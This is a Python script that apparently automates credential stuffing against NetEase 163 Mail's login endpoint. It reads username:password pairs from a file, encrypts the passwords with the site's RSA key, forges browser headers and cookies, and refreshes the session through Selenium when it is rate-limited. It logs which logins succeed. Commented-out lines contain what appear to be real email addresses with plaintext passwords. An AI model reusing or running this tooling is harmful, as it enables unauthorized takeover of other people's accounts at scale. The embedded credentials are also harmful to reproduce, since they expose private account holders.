#coding=utf8
import time
import requests
import json
import asn1
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
import base64
from selenium import webdriver

chromePath = "/Users/ainassine/Downloads/chromedriver"
chromeOptions = webdriver.ChromeOptions()
chromeOptions.add_argument("--proxy-server=http://127.0.0.1:8118")
browser = webdriver.Chrome(executable_path = chromePath,chrome_options = chromeOptions)

hhhh = "https://dl.reg.163.com/src/mp-agent-finger.html"

session_id = "123"

ff = open('recor.txt','a')


'''
-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5gsH+AA4XWONB5TDcUd+xCz7ejOFHZKlcZDx+pF1i7Gsvi1vjyJoQhRtRSn950x498VUkx7rUxg1/ScBVfrRxQOZ8xFBye3pjAzfb22+RCuYApSVpJ3OO3KsEuKExftz9oFBv3ejxPlYc5yq7YiBO8XlTnQN0Sa4R4qhPO3I2MQIDAQAB\n-----END PUBLIC KEY-----
'''

record = []

host_url = "https://dl.reg.163.com"

api2 = "/dl/l"

proxies = {'http':'http://127.0.0.1"8118','https':'http://127.0.0.1:8118',}

pk = "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5gsH+AA4XWONB5TDcUd+xCz7ejOFHZKlcZDx+pF1i7Gsvi1vjyJoQhRtRSn950x498VUkx7rUxg1/ScBVfrRxQOZ8xFBye3pjAzfb22+RCuYApSVpJ3OO3KsEuKExftz9oFBv3ejxPlYc5yq7YiBO8XlTnQN0Sa4R4qhPO3I2MQIDAQAB\n-----END PUBLIC KEY-----"
rsakey = RSA.importKey(pk)
cipher = PKCS1_v1_5.new(rsakey)

def rsa_pw(password=""):
	ct = base64.b64encode(cipher.encrypt(password))
	return ct


def verify(username = "", password = "", session_id = ""):
	print(">> username: %s, password: %s"%(username, password))
	#username = "lai-song675484224@163.com"
	#password = "sl1994317"
	username = username
	password = password
	#username = "343773148@163.com"
	#password = "siyuan21"
	pw = rsa_pw(password=password)

	api1 = "/dl/gt?un=%s&pkid=CvViHzl&pd=mail163&topURL=https://mail.163.com/&rtid=KcHf3Hul7DeMWFu5wWckAFKkJmTnep1V&nocache=1549810777108"%(username)
#	print(api1)

	headers1 = {}
	headers1['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:59.0) Gecko/20100101 Firefox/59.0"
	headers1['Accept'] = "*/*"
	headers1['Accept-Language'] = "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
	headers1['Content-Type'] = "application/json"
	headers1['Referer'] = "https://dl.reg.163.com/webzj/v1.0.1/pub/index_dl2_new.html?cd=https://mimg.127.net/index/holiday/&cf=190131/urs-163.css&MGID=1549780077232.6406&wdaId=&pkid=CvViHzl&product=mail163"

	#response = requests.get("https://mail.163.com",headers=headers1)
	#print(response.text)
	#print('_________________')
	

	time_stamp = int(time.time())

	cookies = {}
	#cookies['JSESSIONID-WYTXZDL']='Tmp2Y1GNNDgJ7PTX2rxAlcjo7%2F5A1Sg56kn41UV66DlBfYPZFzN2GVwNL2FVwhsLyYTe%2B0T5%5C9g8w13TGo7HkT7Vo84O2Dc6ie2bLwBAdcWs%2FWtRNDridlzDDPKkWuBELdTqxUXxzG01J7DtWcWGPenSPbAu6xI7%5Cy1c5d%2BnOyG%5CXZ%2F6%3A1549811373430'
	cookies['JSESSIONID-WYTXZDL']=session_id
	cookies['_ihtxzdilxldP8_']='30'
	cookies['l_s_mail163CvViHzl']='2BDA1093FDDA9283AD02B57FFFEC7E0EFE349E018D82FD9789258A8DDA16F5875754C414AAF87839F52606211EC065FBF6D368B4A650A7DB7DDFA802BD5235811782CB7F4F5A3A7C562EA44480039D82A83A9B859D020EE0F53ACFFA8A6502EC6BFDB9C0D292357BE717DD8CD3A45CD5'
	cookies['THE_LAST_LOGIN']=username
	cookies['nts_mail_user']='%s:-1:1'%username
	cookies['_ntes_nnid']='e52c0fe2aca0792e8b25add4cf6489f3,1549614926176'
	cookies['_ntes_nuid']='e52c0fe2aca0792e8b25add4cf6489f3'
	cookies['mail_psc_fingerprint']='4e1ed1676de09b844a57e00ddd4cd71f'
	cookies['usertrack']='CrHuclxdQhOAYfCdBJWKAg=='
	cookies['l_s_mail163fjWGUOS']='1328C8C807EFAA655C3AC02102019F3D3F0FE7A3726ED10F77557A56F77532687FEBCD34C2161ADDCEC0030758E67FE5B1BDABA5B8F2C174815A99B4AACA86924984CCD8DACD1288E3AA9130577714A9F6CFDF770660BBD6215A98F985EFCD561D2C5A057883198051ED4F7B9529C895'
	cookies['gdxidpyhxdE']='0n%2FnP%2F0wA%5CkO%2FDW6Y443hINddeXhTqopjy1q3dNrX8jcuH0PBHa2ob5mpsmlnnDunQpc035BIT7%5Cy2Hg1t%2B0Z%5C%2BxtbGDka6kCLg3IoJ1CfOYtC%5CE%2Bt1LR7Uf1rBRTTNmEOhz2rtvzY5ARmUOnDDt0YRkYXPRVgiTNJH2%2FNyLgiWCEqL9%3A1549801303976'
	cookies['_9755xjdesxxd_']='32'
	cookies['starttime']=""
	cookies['utid']='Uler37qAwyu3quXXItdcZub70pkPU61n'
	cookies['P_INFO']='%s|1549807818|0|mail163|11&11|shd&1549783078&mail163#shd&370400#10#0#0|&0|mail163|%s'%(username,username)
	cookies['df']='mail163_letter'
	cookies['NNSSPID']='25b726f3ff79437c90b8a5eb2edfee32'
	cookies['webzjcookiecheck']='1'
	


#	print(api1)#
#	for c in cookies.items():
#		print c[0], c[1]
	try:
		#response = requests.get(host_url+api1,headers=headers1,cookies=cookies,proxies=proxies,verify=False)
		response = requests.get(host_url+api1,headers=headers1,cookies=cookies,proxies=proxies)
	except Exception, e:
		print(e)
		record.append({'username':username,'password':password, 'ret':e.message})
		ff.write(json.dumps(record[-1])+"\n")
		ff.flush()
		return
	response_content_json = json.loads(response.content)
#	print(response.content)
	tk = response_content_json['tk']
#	print tk
#	print('___________________')


	data = {}
	data['un'] = username
	#data['pw'] = "GqUgwEm/+Ga6venO0v8rcbT75/hk35ZC1MztCwMBY9sCM4WGbiBDq7KUMaDd4mhzpTDk7YDcL85wecgWmlp7tOtA6srmOEvxsAUfmeIZWSj83cDqSexuxeXg0JI5fVHtbBlNyqR9LKwaAORVvO9vjZNTvbnJwdbCrKGc/BVgOa4="
	#data['pw'] = "fK39i0XESxGxzTGSaeHD9tO+DeMuSA78jVJt0/frvJP7lXVemDkbjlRGTWQ11iorzFm7Q2Ujvetrqauh5IXANMOKrlGZvLujCxLqZWYsgAZdwvPEftUlBGA3jrt+TK5XYT0yvYk2OQlqAas88P2YK5c/N9NEaLnfnF30NU9WBJA="
	#data['pw'] = "bGNA/dVBXyXRXnvgJUAGL2gijfj8bmPHJWsHAlDMEU5UpraNhtxoUD5nsBpaer01WmLkO9wm7PddyZQJ5hpB70BBpUstfaPAtnPTPuXaWO2OaUwm4qTie067jTh8soeBjPBRgK/Nz0iOJZ2k1SUXqboiXYtll9ny0tJyqykw1m8="
	data['pw'] = pw
	data['pd'] = "mail163"
	data['l'] = 0
	data['d'] = 10
	data['t'] = 1549807812816
	data['pkid'] = "CvViHzl"
	data['domains'] = ""
	data['tk'] = tk
	data['pwdKeyUp'] = 1
	data['topURL'] = "https://mail.163.com/"
	data['rtid'] = "IBtPsmAGkBecSoytrjDiKhhW12dQ9Rtv"
#	for d in headers1.items():
#		print d[0], d[1]
	data = json.dumps(data)

	headers1['Referer'] = "https://dl.reg.163.com/webzj/v1.0.1/pub/index_dl2_new.html?cd=https://mimg.127.net/index/holiday/&cf=190131/urs-163.css&MGID=1549780077232.6406&wdaId=&pkid=CvViHzl&product=mail163"

	try:
		#response = requests.post(host_url+api2,headers=headers1,cookies=cookies,data=data,proxies=proxies,verify=False)
		response = requests.post(host_url+api2,headers=headers1,cookies=cookies,data=data,proxies=proxies)
	except Exception,e:
		print(e)
		record.append({'username':username,'password':password, 'ret':e})
		ff.write(json.dumps(record[-1])+"\n")
		ff.flush()
		return
	response_content_json = json.loads(response.content)
	ret = response_content_json['ret']
	#print(ret)
	record.append({'username':username,'password':password, 'ret':ret})
	print(record[-1])
	ff.write(json.dumps(record[-1])+"\n")
	ff.flush()
	return ret


def getSESSIONID():
	browser.delete_all_cookies()
	browser.get(hhhh)
	cs = browser.get_cookies()
	for c in cs:
		if c['name'] == "JSESSIONID-WYTXZDL":
			session_id = c['value']
			break
	browser.quit()
	return session_id

def main():
	print("Start verify...")
	session_id = getSESSIONID()

	f = open('/Users/ainassine/Desktop/163.txt')
	lines = f.readlines()
	f.close()

	l = []
	for line in lines:
		t = line.split(':')
		d = {}
		d['username'] = t[0]
		d['password'] = t[1][:-2]
		l.append(d)

	
	f = open('/Users/ainassine/Desktop/recor.txt')
	lines = f.readlines()
	f.close()
	done_number = len(lines)
#	verify()
	counter = 0
	number = len(l)
	for o in l:
		counter+=1
		if counter <= done_number:
			continue
		print(">>>>> %s/%s"%(counter, number))
		ret = verify(username=o['username'],password=o['password'],session_id=session_id)
		if ret == "445":
			session_id = getSESSIONID()
		#time.sleep(3)
		#print(rsa_pw("password"))

if __name__ == '__main__':
	main()
	ff.close()
